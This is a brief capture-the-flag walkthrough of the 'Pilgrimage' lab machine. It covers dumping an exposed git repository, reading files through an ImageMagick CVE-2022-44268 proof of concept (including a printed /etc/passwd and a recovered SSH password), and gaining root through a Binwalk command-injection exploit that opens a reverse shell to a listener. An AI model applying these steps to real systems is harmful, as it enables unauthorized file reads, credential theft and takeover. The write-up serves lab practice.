file upload http

imagemagick exploit file read 
```
Content-Disposition: form-data; name="toConvert"; filename="images.jpeg"
```
we can see that toConvert seems to be imagemagick 

On nmap we can see there is a git repo on 10.10.11.219:80/.git/ Git repository found!

if we gitdump 
```
sudo git-dumper http://pilgrimage.htb/.git/ git
```

on the files (index.php) we can clearly see that this is a magick converter
on dashboard.php we found $db = new PDO('sqlite:/var/db/pilgrimage');

so lets try the imagemagick file reader 

```
https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC
```

we got /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

we try on the database file and after decoding the hex we get
user emily and emilyabigchonkyboi123 

we can connect  ssh emily@10.10.11.219 with password abigchonkyboi123

user.txt is here

in the box we can see that root make /bin/bash /usr/sbin/malwarescan.sh this is a script that use Binwalk when we check binwalk version we get Binwalk v2.3.2 wich is vulnerable to command injection

https://www.exploit-db.com/exploits/51249

so we create a malicious png with the tool 
open a listenner on our box 
upload the malicious png into the server in /var/www/pilgrimage.htb/shrunk/ (where the script is checking the files) 
and this is rooted
